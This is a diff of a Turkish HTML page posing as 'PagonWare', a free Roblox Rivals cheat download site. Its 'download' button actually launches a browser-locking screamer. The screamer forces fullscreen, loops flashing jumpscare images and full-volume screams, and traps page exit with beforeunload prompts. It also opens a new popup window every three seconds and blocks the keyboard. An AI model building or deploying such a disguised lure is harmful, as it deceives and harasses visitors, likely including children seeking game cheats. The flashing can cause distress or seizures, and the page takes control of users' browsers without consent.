@@ -3,151 +3,184 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SİSTEM ÇÖKTÜ - 0x000666</title>
-    <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
+    <title>PagonWare - En İyi Roblox Rivals Yazılımı</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Creepster&family=Segoe+UI:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body, html { 
-            width: 100%; height: 100%; background: #000; 
-            overflow: hidden; cursor: none; font-family: 'Creepster', cursive;
+        :root {
+            --primary-bg: #191919;
+            --secondary-bg: #232323;
+            --accent-color: #269cc8;
+            --horror-red: #ff0000;
         }
 
-        /* Başlangıç Ekranı (Kullanıcıyı tuzağa çekmek için) */
-        #entry-point {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #111; display: flex; flex-direction: column;
-            justify-content: center; align-items: center; z-index: 20000;
-            color: white; text-align: center;
+        /* --- ANA SİTE STİLLERİ --- */
+        body, html {
+            margin: 0; padding: 0; width: 100%; height: 100%;
+            background-color: var(--primary-bg); color: #fff;
+            font-family: 'Segoe UI', sans-serif; overflow-x: hidden;
         }
+
+        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
         
-        #entry-point h1 { font-size: 3rem; color: #ff0000; margin-bottom: 20px; }
-        .fake-btn {
-            padding: 20px 50px; background: #ff0000; color: white;
-            border: none; font-size: 20px; cursor: pointer; border-radius: 5px;
+        header {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 25px 0; border-bottom: 1px solid rgba(255,255,255,0.1);
         }
 
-        /* Korku Katmanı */
-        #hell-layer {
+        .logo { font-size: 32px; font-weight: 700; }
+        .logo span { color: var(--accent-color); }
+
+        .hero {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 100px 0; min-height: 80vh;
+        }
+
+        .hero-content { flex: 1; }
+        .hero-title { font-size: 48px; margin-bottom: 20px; }
+        
+        .btn-download {
+            background: var(--accent-color); color: white; padding: 18px 45px;
+            border: none; border-radius: 8px; font-weight: bold; font-size: 18px;
+            cursor: pointer; transition: 0.3s; text-transform: uppercase;
+        }
+
+        .btn-download:hover { transform: scale(1.05); background: #1c7ea0; }
+
+        /* --- KORKU MODU EKRANI --- */
+        #horror-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            display: none; justify-content: center; align-items: center;
-            z-index: 10000; background: #000;
+            background: #000; z-index: 99999; display: none;
+            flex-direction: column; justify-content: center; align-items: center;
+            cursor: none;
         }
 
-        #creature-img {
+        #scary-image {
             width: 100%; height: 100%; object-fit: cover;
-            display: none;
+            display: none; position: absolute; top: 0; left: 0;
         }
 
-        .glitch-msg {
-            color: #ff0000; font-size: 8rem; text-align: center;
-            animation: shake 0.05s infinite;
+        .glitch-text {
+            font-family: 'Creepster', cursive; font-size: 8rem;
+            color: var(--horror-red); text-align: center;
+            z-index: 2; animation: chaos-shake 0.1s infinite;
         }
 
-        @keyframes shake {
-            0% { transform: translate(5px, -5px); filter: hue-rotate(90deg) invert(1); }
-            50% { transform: translate(-5px, 5px); filter: hue-rotate(180deg) invert(0); }
-            100% { transform: translate(5px, 5px); }
+        @keyframes chaos-shake {
+            0% { transform: translate(5px, 5px) rotate(0deg); filter: invert(0); }
+            25% { transform: translate(-5px, -10px) rotate(-2deg); filter: hue-rotate(90deg); }
+            50% { transform: translate(10px, 5px) rotate(2deg); filter: invert(1); }
+            75% { transform: translate(-10px, 10px) rotate(-1deg); }
+            100% { transform: translate(5px, -5px) rotate(0deg); }
         }
 
-        .flash-overlay {
+        .flash {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: white; opacity: 0; pointer-events: none; z-index: 10001;
+            background: white; opacity: 0; pointer-events: none; z-index: 100000;
         }
     </style>
 </head>
 <body oncontextmenu="return false;">
 
-    <div id="entry-point">
-        <h1>PAGONWARE V2.1</h1>
-        <p style="margin-bottom: 20px;">Ücretsiz sürümü yüklemek için butona basın.</p>
-        <button class="fake-btn" onclick="startTheHell()">YÜKLEMEYİ BAŞLAT</button>
+    <div id="pagonware-site">
+        <header class="container">
+            <div class="logo">Pagon<span>Ware</span></div>
+            <div style="color: #27ae60; font-weight: bold;"><i class="fas fa-shield-alt"></i> DURUM: AKTİF</div>
+        </header>
+
+        <main class="container hero">
+            <div class="hero-content">
+                <h1 class="hero-title">Rivals İçin En Güçlü <br>Ücretsiz Yazılım</h1>
+                <p style="color: #aaa; font-size: 1.2rem; margin-bottom: 40px;">
+                    Ban korumalı, ESP ve Aimbot destekli PagonWare'i hemen deneyin.
+                </p>
+                <button class="btn-download" onclick="triggerMalware()">Hemen Ücretsiz İndir</button>
+            </div>
+            <div style="flex: 1; text-align: right;">
+                <img src="https://i.hizliresim.com/n2o0qor.png" style="width: 500px; border-radius: 15px; box-shadow: 0 0 50px rgba(38,156,200,0.2);">
+            </div>
+        </main>
     </div>
 
-    <div id="hell-layer">
-        <h1 class="glitch-msg" id="msg">ÖLECEKSİN</h1>
-        <img src="https://i.ibb.co/L6vV5vK/scary.jpg" id="creature-img">
+    <div id="horror-overlay">
+        <h1 class="glitch-text">RUHUNU BİZE VER</h1>
+        <img src="https://i.ibb.co/L6vV5vK/scary.jpg" id="scary-image">
     </div>
 
-    <div class="flash-overlay" id="flash"></div>
+    <div class="flash" id="flash-effect"></div>
 
-    <audio id="scream1" src="https://www.soundjay.com/human/sounds/shout-01.mp3"></audio>
-    <audio id="scream2" src="https://www.fesliyanstudios.com/play-mp3/5647"></audio>
-    <audio id="background-noise" src="https://www.soundjay.com/mechanical/sounds/drone-01.mp3" loop></audio>
+    <audio id="scream1" src="https://www.soundjay.com/human/sounds/shout-01.mp3" preload="auto"></audio>
+    <audio id="scream2" src="https://www.fesliyanstudios.com/play-mp3/5647" preload="auto"></audio>
+    <audio id="ambient" src="https://www.soundjay.com/mechanical/sounds/drone-01.mp3" loop></audio>
 
     <script>
-        const hell = document.getElementById('hell-layer');
-        const entry = document.getElementById('entry-point');
-        const img = document.getElementById('creature-img');
-        const msg = document.getElementById('msg');
-        const flash = document.getElementById('flash');
-        
-        const s1 = document.getElementById('scream1');
-        const s2 = document.getElementById('scream2');
-        const bg = document.getElementById('background-noise');
-
-        function forceFullScreen() {
-            const el = document.documentElement;
-            if (el.requestFullscreen) el.requestFullscreen();
-            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+        function forceFull() {
+            const doc = document.documentElement;
+            if (doc.requestFullscreen) doc.requestFullscreen();
+            else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
         }
 
-        function startTheHell() {
-            // 1. Tam ekran ve Sesleri başlat
-            forceFullScreen();
-            entry.style.display = 'none';
-            hell.style.display = 'flex';
+        function triggerMalware() {
+            // 1. Her şeyi kilitle ve tam ekrana geç
+            forceFull();
+            document.getElementById('pagonware-site').style.display = 'none';
+            document.getElementById('horror-overlay').style.display = 'flex';
             
-            bg.volume = 1.0;
-            bg.play();
+            // 2. Sesleri başlat
+            document.getElementById('ambient').volume = 1.0;
+            document.getElementById('ambient').play();
 
-            // 2. Sayfadan ayrılmayı engelle
-            window.onbeforeunload = function() { return "BURADAN ÇIKIŞ YOK!"; };
+            // 3. Ayrılmayı engelle
+            window.onbeforeunload = () => { return "HİÇBİR YERE GİDEMEZSİN."; };
 
-            // 3. Sonsuz Kaos Döngüsü
+            // 4. Sonsuz Jumpscare Döngüsü
+            setInterval(jumpscareLoop, 3500);
+
+            // 5. Pencere Bombası (Her 3 saniyede bir yeni sekme)
             setInterval(() => {
-                triggerExtremeJumpscare();
+                window.open(window.location.href, '_blank', 'width=300,height=300');
             }, 3000);
-
-            // 4. Pencere Bombası (Her 2 saniyede bir yeni sekme)
-            setInterval(() => {
-                window.open(window.location.href, '_blank', 'width=200,height=200');
-            }, 2000);
         }
 
-        function triggerExtremeJumpscare() {
-            // Görüntüyü değiştir
+        function jumpscareLoop() {
+            const img = document.getElementById('scary-image');
+            const flash = document.getElementById('flash-effect');
+            const s1 = document.getElementById('scream1');
+            const s2 = document.getElementById('scream2');
+
+            // Görseli göster
             img.style.display = 'block';
-            msg.style.display = 'none';
             
-            // Sesleri patlat
-            s1.currentTime = 0; s1.volume = 1.0; s1.play();
-            s2.currentTime = 0; s2.volume = 1.0; s2.play();
+            // Rastgele çığlık seç ve çal
+            const sound = Math.random() > 0.5 ? s1 : s2;
+            sound.currentTime = 0;
+            sound.volume = 1.0;
+            sound.play();
 
-            // Ekranı salla ve flaş patlat
+            // Ekran patlaması
             flash.style.opacity = '1';
-            document.body.style.animation = "shake 0.1s infinite";
+            setTimeout(() => { flash.style.opacity = '0'; }, 150);
 
+            // 1.5 saniye sonra sakla
             setTimeout(() => {
                 img.style.display = 'none';
-                msg.style.display = 'block';
-                flash.style.opacity = '0';
-                document.body.style.animation = "none";
             }, 1500);
         }
 
-        // Tam ekrandan çıkış koruması
+        // Tam Ekran Koruması
         document.addEventListener('fullscreenchange', () => {
-            if (!document.fullscreenElement) {
-                alert("HATA: SİSTEMDEN AYRILAMAZSINIZ!");
-                forceFullScreen();
+            if (!document.fullscreenElement && document.getElementById('pagonware-site').style.display === 'none') {
+                alert("OYUN DAHA BİTMEDİ!");
+                forceFull();
             }
         });
 
-        // Tuşları devre dışı bırak
+        // Klavye Engelleme
         window.addEventListener('keydown', (e) => {
-            e.preventDefault();
-            if(e.key === "Escape") forceFullScreen();
-            return false;
+            if (document.getElementById('pagonware-site').style.display === 'none') {
+                e.preventDefault();
+                return false;
+            }
         });
     </script>
 </body>
